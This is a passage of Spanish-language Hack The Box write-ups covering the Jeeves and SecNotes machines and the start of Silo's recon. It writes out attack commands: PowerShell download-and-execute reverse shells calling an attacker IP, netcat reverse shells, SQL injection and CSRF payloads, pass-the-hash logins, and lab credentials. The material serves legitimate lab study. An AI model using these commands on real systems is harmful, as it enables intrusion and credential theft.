Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 21:30 EDT
Nmap scan report for 10.10.10.63
Host is up (0.069s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-06-23T06:30:29
|_  start_date: 2022-06-22T23:59:38
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.15 seconds
</code></pre>
<h1 id="enumeración-13"><a class="header" href="#enumeración-13">Enumeración</a></h1>
<h2 id="servicios-7"><a class="header" href="#servicios-7">Servicios</a></h2>
<h3 id="http---80-3"><a class="header" href="#http---80-3">http - 80</a></h3>
<p>Se presenta en el sitio web un formulario con un input el cual al realizar el submit se redirige a <code>error.html</code> que presenta un imagen relacionada al tipo de error que arroja un IIS. Dado que está hardcodeada la redireccion no se intentó nada al respecto.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/enum_1.png" alt="Imagen de error mostrada" /></p>
<p>Por otro lado, también se buscó fuzzear directorios mediante <code>ffuf</code>, sin tener éxito mostrando sólo las rutas con las anteriormente se había interactuado.</p>
<h3 id="http---50000"><a class="header" href="#http---50000">http - 50000</a></h3>
<h4 id="manual-4"><a class="header" href="#manual-4">Manual</a></h4>
<p>Se hace la omisión de los puertos en los cuales no se encontró información que pudiera resultar útil, sin embargo, en este puerto es mostrado un error genérico del servidor Jetty exponiendo en primera instancia la versión que se está ejecutando. Después de buscar <a href="https://www.cvedetails.com/product/34824/Eclipse-Jetty.html?vendor_id=10410">vulnerabilidades relacionadas</a> e intentar explotarlas se decidió no darle seguimiento dado que en este punto se había visualizado una ruta expuesta en la ejecución de <code>ffuf</code>.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/enum_2.png" alt="Error de Jetty" /></p>
<h4 id="ffuf-2"><a class="header" href="#ffuf-2">ffuf</a></h4>
<p>Después de casi completar el diccionario que por lo regular se usa, se identificó la ruta <code>askjeeves</code> mediante:</p>
<pre><code class="language-bash">ffuf -c -ic -u http://10.10.10.63:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.xml,.html
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/enum_3.png" alt="Descubrimiento de directorio" /></p>
<p>Por lo que al navegar a esta se identificó la disponibilidad de un servidor Jenkins, abriendo paso a posibles rutas de explotación haciendo uso de las características ofrecidas por la plataforma.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/enum_4.png" alt="Servidor Jenkins disponible" /></p>
<h1 id="explotación-7"><a class="header" href="#explotación-7">Explotación</a></h1>
<h2 id="rce-1"><a class="header" href="#rce-1">RCE 1</a></h2>
<h3 id="pasos-previos--preparación-2"><a class="header" href="#pasos-previos--preparación-2">Pasos previos | Preparación</a></h3>
<p>Jenkins ofrece una consola de scripts siguiendo la sintáxis de Groovy, disponible en <code>Build Executor Status &gt; master &gt; Script Console</code>.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/exploit_1.png" alt="Consola de scripts de Jenkins" /></p>
<p>Al visualizar la sintáxis necesaria para ejecutar comandos de consola expuesta en la misma sección, se preparó la reverse shell de <a href="https://github.com/samratashok/nishang">nishang</a> ejecutando al final del archivo la función empleada para entablar una reverse shell:</p>
<pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
</code></pre>
<h3 id="ejecución-12"><a class="header" href="#ejecución-12">Ejecución</a></h3>
<p>Se envió la invocación al recurso expuesto mediante la consola de scripts:</p>
<pre><code class="language-groovy">print &quot;powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')&quot;.execute().text
</code></pre>
<p>Estableciendo así la reverse shell.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/exploit_2.png" alt="Reverse shell establecida" /></p>
<h2 id="rce-2"><a class="header" href="#rce-2">RCE 2</a></h2>
<h3 id="pasos-previos--preparación-3"><a class="header" href="#pasos-previos--preparación-3">Pasos previos | Preparación</a></h3>
<p>Igualmente se pueden ejecutar comandos directamente en la máquina mediante la creación de un nuevo item <code>Create New Item &gt; Freestyle Project &gt; Build &gt; Execute Windows batch command</code>, guardando en el campo de texto el comando a ejecutar:</p>
<pre><code class="language-powershell">powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/exploit_3.png" alt="Comando a ejecutar" /></p>
<h3 id="ejecución-13"><a class="header" href="#ejecución-13">Ejecución</a></h3>
<p>Restando sólo guardar el proceso en la plataforma y ejecutarlo (<code>Save &gt; Build Now</code>). Teniendo de esta forma otra manera de ejecutar comandos a través de Jenkins.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/exploit_4.png" alt="Ejecutando el item creado" /></p>
<h1 id="post-explotación-7"><a class="header" href="#post-explotación-7">Post Explotación</a></h1>
<h2 id="enumeración-14"><a class="header" href="#enumeración-14">Enumeración</a></h2>
<p>Al ejecutar:</p>
<pre><code>whoami /all
</code></pre>
<p>Para observar los privilegios con los que cuenta el usuario, se visualizó disponible el privilegio <code>SeImpersonatePrivilege</code> habilitado lo que denota la ruta de escalación haciendo uso de <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_1.png" alt="SeImpersonatePrivilege habilitado" /></p>
<p>Además, se identificó una base de datos de KeePass <code>CEH.kdbx</code> en el directorio <code>Documents</code> del usuario, abriendo otra ruta de escalación si se llegara a encontrar información relevante para el proceso.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_2.png" alt="Base de datos de KeePass" /></p>
<h2 id="escalación-de-privilegios-6"><a class="header" href="#escalación-de-privilegios-6">Escalación de privilegios</a></h2>
<h3 id="kohsuke--nt-authoritysystem"><a class="header" href="#kohsuke--nt-authoritysystem">kohsuke → nt authority\system</a></h3>
<h4 id="juicypotato-1"><a class="header" href="#juicypotato-1">JuicyPotato</a></h4>
<p>Al cargar previamente el binario de netcat y ejecutar el binario de JuicyPotato se obtuvo una reverse shell como <code>nt authority\system</code> mediante:</p>
<pre><code class="language-powershell">.\jp.exe -t * -l 1337 -p cmd.exe -a &quot; /c C:\users\kohsuke\downloads\nc.exe -e cmd.exe 10.10.14.16 1234&quot;
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_3.png" alt="Obtención de reverse shell como administrator" /></p>
<ol>
<li>Ejecución de JuicyPotato.</li>
<li>Otención de reverse shell.</li>
</ol>
<h4 id="keepass"><a class="header" href="#keepass">KeePass</a></h4>
<p>Se extrajo la base de datos de KeePass haciendo uso de la utilería de <a href="https://github.com/SecureAuthCorp/impacket">impacket</a>, mediante:</p>
<pre><code class="language-bash">impacket-smbserver smbFolder $(pwd) -smb2support` y realizando el copiado con `cp .\CEH.kdbx \\10.10.14.16\smbFolder
</code></pre>
<p>Posteriormente, para crackear el archivo fue necesario primero extraer el hash del mismo, usando <code>keepass2john CEH.kdbx &gt; ceh.hash</code> para a continuación iniciar el proceso de cracking haciendo uso de:</p>
<pre><code class="language-bash">john ceh.hash --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
<p>Obteniendo así la contraseña del archivo (<code>moonshine1</code>).</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_4.png" alt="Cracking de archivo de KeePass" /></p>
<p>La base de datos expone múltiples entradas con contraseñas disponibles aunque una en particular se realzó por sobre todas debido al formato de la entrada. Identificandola como un hash NTLM <code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_5.png" alt="Contenido de entrada sobresaliente" /></p>
<p>Por lo que hizo uso de nuevo de impacket para conectar a la máquina proveyendo el hash. Dada la estructura de lo hashes NTLM se podría usar tanto como:</p>
<pre><code class="language-bash">impacket-psexec 'administrator@10.10.10.63' -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'
</code></pre>
<p>Como con:</p>
<pre><code class="language-bash">impacket-psexec 'administrator@10.10.10.63' -hashes ':e0fb1fb85756c24235ff238cbe81fe00'
</code></pre>
<p>Debido a que la primera mitad corresponde al identificador de la máquina y la segunda a la &quot;autorización&quot; del usuario.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_6.png" alt="Acceso mediante hash" /></p>
<h4 id="obtención-de-bandera"><a class="header" href="#obtención-de-bandera">Obtención de bandera</a></h4>
<p>Después de buscar extraer el contenido de la bandera, se encontró el archivo <code>hm.txt</code> el cuál indica que la bandera no se encuentra presente si no en otro sitio. Durante ese proceso se encontró información referente a los <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">Alternate Data Streams</a> que básicamente son una forma de ocultar información en un archivo y la característica existe únicamente en sistemas de archivos de tipo NTFS.</p>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_7.png" alt="Mensaje de supuesta bandera" /></p>
<p>Por lo que haciendo uso de los comandos sugeridos en el artículo se pudo visualizar que el stream oculto era <code>root.txt</code> con:</p>
<pre><code class="language-powershell">powershell.exe get-item -path .\hm.txt -stream *
</code></pre>
<p>Para posteriormente extraer su contenido mediante:</p>
<pre><code class="language-powershell">powershell.exe get-content -path .\hm.txt -stream root.txt
</code></pre>
<p><img src="htb/boxes/windows/2_medio/Jeeves/images/post_8.png" alt="Extracción de data streams" /></p>
<h1 id="referencias-10"><a class="header" href="#referencias-10">Referencias</a></h1>
<ul>
<li><a href="https://www.cvedetails.com/product/34824/Eclipse-Jetty.html?vendor_id=10410">CVE Details - Jetty</a>.</li>
<li><a href="https://github.com/samratashok/nishang">Github - Nishang</a>.</li>
<li><a href="https://github.com/ohpe/juicy-potato">Github - JuicyPotato</a>.</li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Github - Impacket</a>.</li>
<li><a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">Introduction to Alternate Data Streams</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-8"><a class="header" href="#estadísticas-8">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/151">SecNotes</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Medium</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/2_medio/SecNotes/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>30</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/4935">0xdf</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-8"><a class="header" href="#reconocimiento-8">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-8"><a class="header" href="#escaneo-de-host-8">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-8"><a class="header" href="#escaneo-completo-de-puertos-8">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 12:56 EDT
Initiating Connect Scan at 12:56
Scanning 10.10.10.97 [65535 ports]
Discovered open port 80/tcp on 10.10.10.97
Discovered open port 445/tcp on 10.10.10.97
Connect Scan Timing: About 27.21% done; ETC: 12:58 (0:01:23 remaining)
Discovered open port 8808/tcp on 10.10.10.97
Completed Connect Scan at 12:57, 71.58s elapsed (65535 total ports)
Nmap scan report for 10.10.10.97
Host is up, received user-set (0.067s latency).
Scanned at 2022-06-20 12:56:42 EDT for 71s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
445/tcp  open  microsoft-ds  syn-ack
8808/tcp open  ssports-bcast syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 71.61 seconds
</code></pre>
<h3 id="escaneo-específico-8"><a class="header" href="#escaneo-específico-8">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 80,445,8808 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 13:01 EDT
Nmap scan report for 10.10.10.97
Host is up (0.068s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-06-20T17:01:33
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2022-06-20T10:01:31-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.84 seconds
</code></pre>
<h1 id="enumeración-15"><a class="header" href="#enumeración-15">Enumeración</a></h1>
<h2 id="servicios-8"><a class="header" href="#servicios-8">Servicios</a></h2>
<h3 id="http---80-4"><a class="header" href="#http---80-4">http - 80</a></h3>
<h4 id="manual-5"><a class="header" href="#manual-5">Manual</a></h4>
<p>Se presenta un sistema de autenticación permitiendo el registro y el acceso a una aplicación para crear y guardar notas personales por usuario. Exponiendo diveras rutas, obtenidas al iteractuar manualmente con el sitio, para dar paso a posibles caminos de explotación.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/enum_1.png" alt="Página principal de sitio" /></p>
<p>Por ejemplo, se visualizó que el sitio está haciendo uso de PHP lo que pudiera significar que para interactuar (acciones CRUD de notas) por atrás se hace uso de alguna base de datos y esto se reduciría a una posible inyección SQL.</p>
<p>Otra ruta expuesta, la cuál expone un posible usuario de sistema (<code>tyler</code>) y el dominio (<code>secnotes.htb</code>) es <code>/contact.php</code>. Bajo la suposición que <code>tyler</code> también es un usuario de la plataforma se podría craftear un payload XSS que permitiera capturar su cookie de sesión.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/enum_2.png" alt="Visualización de contact.php" /></p>
<h4 id="ffuf-3"><a class="header" href="#ffuf-3">ffuf</a></h4>
<p>Después de enumerar automáticamente las rutas y subdominios, no se identificó nada relevante para las futuras fases.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/enum_3.png" alt="Salida de ffuf" /></p>
<h3 id="http---8808"><a class="header" href="#http---8808">http - 8808</a></h3>
<p>Se presenta únicamente el inicio por default de un servidor IIS, sin la obtención de directorios existentes mediante el fuzzeo.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/enum_4.png" alt="Sitio por default de IIS" /></p>
<h1 id="explotación-8"><a class="header" href="#explotación-8">Explotación</a></h1>
<h2 id="xss"><a class="header" href="#xss">XSS</a></h2>
<p>Después de identificar la vulnerabilidad creando una nota para probar el payload y siendo que se tiene la ruta de <code>contact.php</code> se podría haber explotado si existiera interacción mediante lo enviado y lo recibido al usuario <code>tyler@secnotes.htb</code>. A pesar de funcionar, no fue el caso.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_1.png" alt="Payload XSS" /></p>
<p>Prueba de ejecución</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_2.png" alt="Payload XSS" /></p>
<h2 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h2>
<p>Después de probar diferentes métodos tanto de manera manual como haciendo uso de <code>sqlmap</code>, principalmente en la creación de notas, no se identificó en esta sección, por lo que después de identificar que el usuario también es mostrado en la visualización de las notas, se probó inyectar en este campo el payload.</p>
<p>Haciendo uso de las <a href="htb/boxes/windows/2_medio/SecNotes/index.html#referencias">3 referencias marcadas</a> relacionadas con la inyección SQL, se procedió a ejecutar parte de la metodología para encontrar un modo de obtener una shell. Por lo que como paso inicial se reconoció que se efectuaba la inyección dado que al registrar un usuario <code>'</code> se obtenia un error a la hora de hacer el logueo.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_3.png" alt="Creación de usuario con comilla" /></p>
<p>Error al loguear con credenciales.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_4.png" alt="Error al realizar logueo" /></p>
<p>A lo que posteriormente se buscó identificar el número de columnas presentes en la tabla usada, registrado un usuario iteratibamente de 1 a N hasta que se desplegara un error (quinta iteración) encontrando así el número 4 mediante <code>' ORDER BY 4-- -</code>.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_5.png" alt="Tamaño de columnas encontrado" /></p>
<p>Dándole seguimiento al proceso se ejecutó <code>' UNION SELECT 1,2,3,4-- -</code> para identificar aquellas columnas que fueran cadenas para poder desplegar información allí, identificando así la 2,3 y 4.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_6.png" alt="Columnas que almacenan cadenas de texto" /></p>
<p>De acuerdo a las referencias encontradas se asumió que el nombre de la tabla que contenía las credenciales del sitio era común (<code>users</code>), por lo que no sé necesitó encontrar el nombre de las tablas y bases de datos, además de que se presentó una limitación referente a la longitud en el campo de usuario, por consiguiente las consultas a inyectar quedaban un tanto restringidas pero mediante <code>' UNION SELECT 1,username,3,4 FROM users-- -</code> y <code>' UNION SELECT 1,password,3,4 FROM users-- -</code> se pudieron identificar los usuarios y sus contraseñas, siendo relevante sólo usuario <code>tyler</code>.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_7.png" alt="Listado de usuarios" /></p>
<p>Hashes de usuarios</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_8.png" alt="Listado de hashes" /></p>
<p>Dado que al buscar realizar el crackeo del hash obtenido tomó tiempo significativo a la hora de su ejecución, se decidió buscar y emplear otro payload que de alguna forma realizara un bypass al logueo de este usuario, empleando <code>' OR 1=1-- -</code> para forzar un resultado booleano dado que se obtienen las notas del usuario en turno, logrando así el despliegue de las notas de todos los usuarios, exponiendo lo que por sintaxis se asume que son credenciales del servicio de <code>smb</code>.</p>
<pre><code class="language-text">\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&amp;
</code></pre>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_9.png" alt="Credenciales expuestas" /></p>
<p>Con las credenciales obtenidas se probó el acceso haciendo de uso de:</p>
<pre><code class="language-bash">crackmapexec smb 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&amp;' --shares
</code></pre>
<p>Visualizando así los folders compartidos y pudiendo tener acceso de lectura y escritura a <code>new-site</code>.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_10.png" alt="Ejecución de crackmapexec" /></p>
<p>Al entrar al folder compartido con:</p>
<pre><code class="language-bash">smbclient \\\\10.10.10.97\\new-site -U 'tyler'
</code></pre>
<p>Se visualizaron los archivos predeterminados en el servidor IIS por que se puede relacionar con el puerto <code>8808</code>.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_11.png" alt="Ejecución de crackmapexec" /></p>
<h2 id="rce-2"><a class="header" href="#rce-2">RCE</a></h2>
<p>Al probar directamente la carga de un archivo que pudiera brindar ejecución remota de instrucciones en el servicio de smb, se identificó que en el escenario planteado no fueron funcionales las shells bajo las extensiones asp y aspx, dado que previamente se identificó el uso de PHP, se probó una shell de este tipo.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_12.png" alt="Carga de shell en php" /></p>
<p>Obteniendo así ejecución de comandos.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_13.png" alt="Ejecución de comandos vía web" /></p>
<p>Para entablar una reverse shell, inicialmente se buscó cargar el binario de netcat en la máquina, método que no funcionó en esta ocasión, razón por la que se busco invocar la revershell de powershell ofrecida por <a href="https://github.com/samratashok/nishang">nishang</a>. Disponible tanto en el repositorio como en el manejador de paquetes de kali (<code>sudo apt install nishang</code>).</p>
<p>Después de generar una copia y modificar el archivo <code>/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1</code>, añadiendo hasta el final la llamada a la función: </p>
<pre><code class="language-powershell">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443
</code></pre>
<p>Exponiéndola mediante un servicio web, se entabló una reverse shell satisfactoriamente mediante la invocación de la request:</p>
<pre><code class="language-url">http://10.10.10.97:8808/shell.php?cmd=powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')
</code></pre>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/exploit_14.png" alt="Reverse shell entablada" /></p>
<h1 id="post-explotación-8"><a class="header" href="#post-explotación-8">Post Explotación</a></h1>
<h2 id="enumeración-16"><a class="header" href="#enumeración-16">Enumeración</a></h2>
<p>Después de navegar a través del sistema de archivos se identificó en la ruta <code>C:\</code> un archivo zip con el nombre de <code>Ubuntu.zip</code> además de encontrarse con la ruta <code>C:\Distros\Ubuntu</code> dándo oportunidad para suponer que se trataba de la tecnología empleada en sistemas windows, WSL (Windows Subsystem for Linux).</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_1.png" alt="Directorios y zip expuestos" /></p>
<p>Al ejecutar winPEAS se corroboró su existencia y se pudo identificar que el usuario por defecto en el sub-sistema es <code>root</code> mediante la invocación de comandos como:</p>
<pre><code class="language-powershell">wsl.exe whoami
wsl.exe ls -la /
</code></pre>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_2.png" alt="WSL reportado por winPEAS" /></p>
<p>Ejecución de comandos mediante <code>wsl.exe</code>.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_3.png" alt="Ejecución de comandos por medio de wsl.exe" /></p>
<h2 id="escalación-de-privilegios-7"><a class="header" href="#escalación-de-privilegios-7">Escalación de privilegios</a></h2>
<h3 id="tyler--nt-authoritysystem"><a class="header" href="#tyler--nt-authoritysystem">tyler → nt authority\system</a></h3>
<p>Después de navegar en los directorios del sub-sistema se encontró la disponibilidad del archivo <code>.bash_history</code> del usuario <code>root</code>, exponiendo de esta manera la contraseña del usuario <code>administrator</code> de windows.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_4.png" alt="Contraseña de administador expuesta" /></p>
<p>Dado que <code>smbclient</code> utiliza como separador el caracter <code>%</code> a diferencia de otras herramientas, se idenficó la contraseña como <code>u6!4ZwgwOM#^OBf#Nwnh</code> por lo que a partir de ahí se entabló una reverse shell como administrador haciendo uso de:</p>
<pre><code class="language-bash">impacket-psexec 'administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97'
</code></pre>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_5.png" alt="Reverse shell como administador" /></p>
<h2 id="notas-adicionales-2"><a class="header" href="#notas-adicionales-2">Notas adicionales</a></h2>
<p>Como es costumbre suelo comparar mi resolución de la máquina tanto como con la oficial, como con la de otros (principalmente <a href="https://www.youtube.com/c/ippsec">IppSec</a> y <a href="https://0xdf.gitlab.io/">0xdf</a>), para aprender otras técnicas, procesos y mejorar continuamente, encontrando así otro método de explotación disponible en la aplicación web siendo ésta la forma intencionada de explotación.</p>
<h3 id="cross-site-request-forgery-csrf"><a class="header" href="#cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</a></h3>
<p>En la plataforma es identificada la vulnerabilidad debido a que en la sección de cambio de contraseña, no se pide al usuario validar la contraseña actual, pidiendo solamente la nueva contraseña y la confirmación de esta.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_6.png" alt="Cambio de contraseña disponible" /></p>
<p>Lo que permite capturar la petición para visualizar como está construida y enviar una petición modificada al usuario de contacto para poder cambiar la contraseña de este.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_7.png" alt="Petición de cambio de contraseña" /></p>
<p>Enviando por medio de la sección de contacto el mensaje:</p>
<pre><code class="language-text">http://10.10.10.97/change_pass.php?password=srrequiem&amp;confirm_password=srrequiem&amp;submit=submit
</code></pre>
<p>Esperando que sea abierto y posteriormente corroborando su ejecución al intentar loguearse como el usuario <code>tyler:srrequiem</code>, se obtiene acceso a las notas de <code>tyler</code>.</p>
<p><img src="htb/boxes/windows/2_medio/SecNotes/./images/post_8.png" alt="Logueo de usuario tyler con contraseña cambiada" /></p>
<h1 id="referencias-11"><a class="header" href="#referencias-11">Referencias</a></h1>
<ul>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger - SQL injection cheat sheet</a>.</li>
<li><a href="https://portswigger.net/web-security/sql-injection/union-attacks">PortSwigger - SQL injection UNION attacks</a>.</li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">HackTricks - SQL injection</a>.</li>
<li><a href="https://github.com/samratashok/nishang">Github - Nishang</a>.</li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#windows-subsystem-for-linux-wsl">HackTricks - Windows Subsystem for Linux (wsl)</a>.</li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Github - Impacket Suite</a>.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="estadísticas-9"><a class="header" href="#estadísticas-9">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/131">Silo</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Medium</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="htb/boxes/windows/2_medio/Silo/images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>30</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/1190">egre55</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento-9"><a class="header" href="#reconocimiento-9">Reconocimiento</a></h1>
<h2 id="escaneo-de-host-9"><a class="header" href="#escaneo-de-host-9">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos-9"><a class="header" href="#escaneo-completo-de-puertos-9">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:09 EDT
Initiating SYN Stealth Scan at 23:09
Scanning 10.10.10.82 [65535 ports]
Discovered open port 80/tcp on 10.10.10.82
Discovered open port 445/tcp on 10.10.10.82
Discovered open port 139/tcp on 10.10.10.82
Discovered open port 135/tcp on 10.10.10.82
Discovered open port 49161/tcp on 10.10.10.82
Discovered open port 49155/tcp on 10.10.10.82
Discovered open port 49162/tcp on 10.10.10.82
Discovered open port 49154/tcp on 10.10.10.82
Discovered open port 49160/tcp on 10.10.10.82
Discovered open port 47001/tcp on 10.10.10.82
Discovered open port 49153/tcp on 10.10.10.82
Discovered open port 49159/tcp on 10.10.10.82
Discovered open port 49152/tcp on 10.10.10.82
Discovered open port 5985/tcp on 10.10.10.82
Discovered open port 1521/tcp on 10.10.10.82
Completed SYN Stealth Scan at 23:09, 13.20s elapsed (65535 total ports)
Nmap scan report for 10.10.10.82
Host is up, received user-set (0.064s latency).
Scanned at 2022-05-23 23:09:27 EDT for 14s
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1521/tcp  open  oracle       syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
